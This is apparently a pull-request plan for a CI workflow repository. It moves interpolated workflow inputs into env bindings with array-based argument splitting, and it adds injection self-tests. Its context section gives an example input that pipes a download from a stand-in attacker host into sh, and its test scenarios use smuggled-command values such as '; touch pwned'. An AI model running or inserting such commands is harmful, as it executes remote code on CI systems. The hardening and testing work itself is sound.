# Bind interpolated workflow inputs through environment mappings

Addresses [#115](https://github.com/cboone/gh-actions/issues/115) and
[#95](https://github.com/cboone/gh-actions/issues/95). Both close from the same
pull request.

## Context

`docs/development.md` § Shell Conventions states that ordinary data and argument
inputs reach shell steps through `env:` mappings, with quoted variables and
explicit argument arrays. Four reusable-workflow call sites still interpolate
`${{ inputs.* }}` directly into `run:` shell source, so those values are not
data the shell receives: they become shell text before bash parses the script. A
caller passing `release --clean; curl evil.example/x | sh` gets that executed.

The exposure is bounded by who can set the input, which is someone who can
usually edit the calling workflow anyway, so this is hardening and convention
work rather than an urgent vulnerability. It still matters because this
repository feeds every downstream Go, Rust and Zig repository, and because the
documentation currently has to carry a migration-gap disclaimer in four places
to stay accurate.

The intended outcome: every ordinary input enters through `env:`, argument
splitting happens in one documented form everywhere, a CI self-test proves that
hostile input values cannot execute commands or alter shell syntax, and the
migration-gap language leaves the documentation for good.

## Audit results

A full sweep of all 23 reusable workflows and all 16 composite actions found 13
`${{ ... }}` expressions inside `run:` blocks. Every composite action under
`actions/` is already clean.

| Site                          | Input             | Disposition                                  |
| ----------------------------- | ----------------- | -------------------------------------------- |
| `run-go-ci.yml:116`           | `test-flags`      | Migrate (named in #115)                      |
| `run-go-ci.yml:117`           | `codecov-files`   | Migrate (named in #115)                      |
| `run-go-ci.yml:159`           | `codecov-files`   | Migrate (named in #115)                      |
| `release-go-binaries.yml:104` | `goreleaser-args` | Migrate (named in #115 and #95)              |
| `run-rust-ci.yml:376`         | `codecov-files`   | Migrate (**not** named in #115)              |
| `deploy-to-pages.yml:94`      | `build-command`   | Sanctioned command input, document it        |
| `run-go-ci.yml:268,271`       | `scrut-*-cmd`     | Sanctioned command input, already documented |
| `run-scrut-tests.yml:117`     | `scrut-setup-cmd` | Sanctioned command input, already documented |
| `run-zig-ci.yml:328,331`      | `scrut-*-cmd`     | Sanctioned command input, already documented |
| `deploy-to-pages.yml:85`      | ternary literal   | Not caller-controlled, allowlist it          |
| `publish-to-npm.yml:59`       | ternary literal   | Not caller-controlled, allowlist it          |

The two ternaries select between the string constants `npm ci` and
`npm install`; no caller value reaches the shell.

The sweep also found two inputs that already arrive through `env:` but are split
by unquoted word splitting rather than an explicit array, which glob-expands each
token against the working directory: `cross-targets` at `run-zig-ci.yml:277` and
`targets` at `release-zig-binaries.yml:104`, both `for target in ${TARGETS}`.
These are in scope by owner decision.

## Decisions taken

1. **Splitting form.** `read -r -a` into a bash array, matching the Rust and Zig
   workflows and `.github/workflows/AGENTS.md`. The newline-delimited composite
   form would break every caller passing a multi-flag string.
1. **Multi-line values are rejected everywhere.** `read -r -a x <<< "$V"` reads
   only the first line, so a multi-line value would be silently truncated. Every
   `read -r -a` argument site gains an `::error::` guard, including the sites
   that already conform.
1. **Released as a minor change.** CHANGELOG entries under Unreleased with
   explicit before and after notes; no `docs/migrations/v4.md`. A code search
   across the `cboone`, `swing-left` and `vote-forward` orgs found exactly one
   caller setting any of these inputs: `cboone/right-round` passes
   `test-flags: "-race -coverprofile=coverage.out"`, which is plain
   space-delimited text with no glob, variable or quoting, so it tokenizes
   identically under `read -r -a`. That repository does not set `coverage: true`,
   so the step does not run there at all. Nothing observable changes for any
   current consumer.
1. **`build-command` is a sanctioned command input**, added to the documented
   list beside `scrut-setup-cmd` and `scrut-build-cmd`.

## Changes

### 1. The canonical argument-splitting form

Every splitting site converges on this shape. `<NAME>` is the input's
kebab-case name as a caller writes it, so the diagnostic names what they set.

```yaml
- name: Run GoReleaser
  shell: bash
  env:
    GORELEASER_ARGS: ${{ inputs.goreleaser-args }}
  run: |
    if [[ "${GORELEASER_ARGS}" == *$'\n'* ]]; then
      echo "::error::goreleaser-args must be a single line of space-separated arguments" >&2
      exit 1
    fi
    args=(goreleaser)
    if [ -n "${GORELEASER_ARGS}" ]; then
      read -r -a extra <<< "${GORELEASER_ARGS}"
      args+=("${extra[@]}")
    fi
    "${args[@]}"
```

The guard is repeated per site rather than factored into a helper. Reusable
workflow steps cannot share a shell function, and
`actions/install-cspell-dictionaries/install-cspell-dictionaries.sh:44-47`
records the same reasoning for the installers: each unit stays self-contained.

### 2. Migrate the four interpolated sites

- `.github/workflows/run-go-ci.yml`, `Run tests with coverage`: add
  `shell: bash` and `env:` bindings `TEST_FLAGS` and `CODECOV_FILE`. Build
  `args=(go test -v)`, append the split `TEST_FLAGS`, then append
  `"-coverprofile=${CODECOV_FILE}"` and `./...` as array elements. Quoting the
  path inside the array element keeps a path with spaces as one argument, which
  the current unquoted form does not.
- `.github/workflows/run-go-ci.yml`, `Upload coverage to Codecov`: add
  `CODECOV_FILE` to the step's existing `env:` block and use
  `--file "${CODECOV_FILE}"`.
- `.github/workflows/run-rust-ci.yml`, `Upload coverage to Codecov`: the same
  one-line addition. The identical binding already exists two steps earlier at
  line 319; this step simply did not reuse it.
- `.github/workflows/release-go-binaries.yml`, `Run GoReleaser`: add
  `shell: bash` and a `GORELEASER_ARGS` binding to the existing `env:` block,
  then the canonical form above.

### 3. Add the newline guard to the conforming sites

Same guard, no other change, at every existing `read -r -a` argument site:

- `.github/workflows/run-rust-ci.yml`: `extra-components` (`Install extra
components`), `test-args` (both `Run tests` and `Run tests with coverage`),
  `clippy-args` (`Run clippy`).
- `.github/workflows/release-rust-binaries.yml`: `build-args` (`Build`).
- `.github/workflows/run-zig-ci.yml`: `fmt-paths` (`Check formatting`), beside
  its existing empty-list guard.

### 4. Convert the two unquoted Zig loops to explicit arrays

`run-zig-ci.yml`'s `Cross compile` and `release-zig-binaries.yml`'s
`Build and package` replace `for target in ${TARGETS}` with the guard plus
`read -r -a targets <<< "${TARGETS}"` and `for target in "${targets[@]}"`. Both
inputs are documented as space-separated and default to a folded scalar that
collapses to one line, so the guard costs current callers nothing and removes
the last glob expansion of an input value in the repository.

### 5. Integration coverage

New fixture `tests/fixtures/check-workflow-arg-binding.mjs`, following
`tests/fixtures/check-zig-format-paths.mjs`: parse the production workflow with
`yaml`, assert the step's bindings, then run `step.run` under `/bin/bash` with a
controlled environment rather than duplicating the shell logic.

Static scenarios, which run anywhere and guard the policy going forward:

- `policy`: every `run:` block in every reusable workflow contains no `${{`,
  except an allowlist of the six sanctioned command-input sites and the two
  literal-yielding ternaries. A new interpolation fails this.
- `bindings`: each migrated step declares `shell: bash` and the expected `env:`
  keys.
- `guards`: every step whose `run:` contains `read -r -a` also contains the
  newline guard for that variable, so the uniform behavior stays uniform as
  sites are added.

Execution scenarios, run against the `go test` and `goreleaser` steps with stub
executables on `PATH` that record their argument vector one element per line:

- `defaults`: the shipped defaults produce the expected argument vector.
- `spaces`: `codecov-files` of `cover report.out` arrives as the single
  argument `-coverprofile=cover report.out`.
- `boundaries`: runs of spaces and tabs collapse; `--a  --b` is two arguments.
- `metacharacters`: `release --clean; touch pwned` arrives as literal tokens and
  creates no file.
- `substitution`: `$(touch pwned)`, backticks and `$HOME` arrive literally.
- `glob`: `--config configs/*.yml` arrives literally, the documented change.
- `empty`: an empty value appends no argument.
- `multiline`: the guard exits 1 with its `::error::` diagnostic.

The two Codecov steps are asserted statically, not executed: their `run:` blocks
download and checksum the Codecov CLI, so executing them would reach the network.
The quoted-scalar property they rely on is covered by executing the `go test`
step with the same hostile `codecov-files` values.

Driven by `tests/scrut/workflow-arg-binding.md`, one section per scenario, from
a new `workflow-arg-binding` job in `.github/workflows/run-ci.yml` on
`ubuntu-latest` and `macos-latest`. The fixture spawns `/bin/bash` directly, so
the macOS runner exercises bash 3.2. The job needs only `actions/checkout`,
`actions/setup-node`, `npm ci` and `./actions/set-up-scrut`; no language
toolchain, unlike `zig-format-paths`.

### 6. Documentation

Remove the migration-gap language, now that no gap remains:

- `docs/development.md` § Shell Conventions: drop the migration-gap paragraph,
  add `deploy-to-pages.yml`'s `build-command` to the sanctioned command-input
  list, state the single splitting rule and the newline rejection, and reference
  the enforcing self-test.
- `docs/development.md` § Testing: describe the new job and what it covers.
- `AGENTS.md`, Critical constraints: drop
  `; existing interpolation gaps are tracked in #115`.
- `.github/copilot-instructions.md`: replace the "Env mappings are policy, with
  tracked implementation gaps" bullet with the policy as it now holds, naming
  the sanctioned command inputs.
- `.github/workflows/AGENTS.md`: broaden the Rust-scoped `read -r -a` bullet to
  every reusable-workflow argument and path-list input, and state the newline
  rejection.

Update the input descriptions, in both the workflow YAML and
`docs/workflows/<name>.md`, for `run-go-ci`, `release-go-binaries`,
`run-rust-ci`, `release-rust-binaries`, `run-zig-ci` and
`release-zig-binaries`, following the wording `run-zig-ci.yml`'s `fmt-paths`
already uses: quoting, escaping and glob expansion are not supported, and the
value must be a single line.

`CHANGELOG.md` gains Unreleased entries recording the binding, the enforced
splitting form and each behavior change below, referencing (#115) and (#95).

## Behavior changes and migration guidance

For `goreleaser-args`, `test-flags` and `codecov-files`, values that the runner
previously expanded now arrive literally:

- A glob such as `--config configs/*.yml` is passed through unexpanded. Name the
  file, or let the tool do its own globbing.
- `$VAR`, `$(command)` and backticks are no longer expanded. Set the value from
  the caller's own expression instead.
- `~` is no longer expanded. Use an absolute path or `${HOME}`.
- Quoting inside the value never worked and still does not: `--foo "a b"`
  tokenizes to `--foo`, `"a`, `b"`.
- `codecov-files` may now contain spaces, which previously broke the command.

Across every `*-args`, `*-flags`, `fmt-paths`, `cross-targets` and `targets`
input, a value containing a newline now fails the step with an `::error::`
diagnostic instead of being partly ignored.

## Verification

```bash
make lint          # actionlint, with shellcheck over the new run: blocks
make lint-yaml     # yamllint
make format        # Prettier
make lint-md       # markdownlint-cli2
make spell         # cspell
```

`cspell .` does not descend into `.github/`, so spell-check the workflow and
Copilot instruction edits explicitly by passing their paths.

Run the new fixture locally before pushing, which needs no runner:

```bash
npm ci
node tests/fixtures/check-workflow-arg-binding.mjs policy
node tests/fixtures/check-workflow-arg-binding.mjs metacharacters
```

Confirm the audit claim still holds, which is what keeps the documentation true:

```bash
grep -rn '\${{' .github/workflows/*.yml actions/*/action.yml
```

Every hit inside a `run:` block must be one of the six sanctioned command inputs
or the two literal-yielding ternaries. The `policy` scenario asserts exactly
this, so a failure there and a surprise here should agree.

On the pull request, confirm the `workflow-arg-binding` job passes on both
runners, and that `run-ci.yml`'s existing `scrut`, `zig-format-paths` and
`shellcheck-only` jobs stay green, since this change touches shell blocks that
actionlint and shellcheck examine.

Neither `run-go-ci.yml` nor `release-go-binaries.yml` is self-hosted by
`run-ci.yml`, which is why the fixture executes their steps directly. After
merge, a consuming Go repository exercises the production path on its next
release.
